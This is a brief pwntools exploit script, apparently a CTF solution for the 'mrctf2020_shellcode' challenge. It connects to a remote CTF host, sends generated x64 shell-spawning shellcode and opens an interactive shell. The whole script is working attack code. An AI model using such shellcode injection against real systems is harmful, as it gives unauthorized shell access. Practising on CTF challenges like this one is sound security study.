#Made by fly_autumn
#x64 shellcode
from pwn import *
#p = process("./mrctf2020_shellcode")
p = remote("node5.buuoj.cn",27087)
elf = ELF("./mrctf2020_shellcode")
context(os="linux",arch="amd64")

shellcode = asm(shellcraft.sh())
p.sendline(shellcode)

p.interactive()
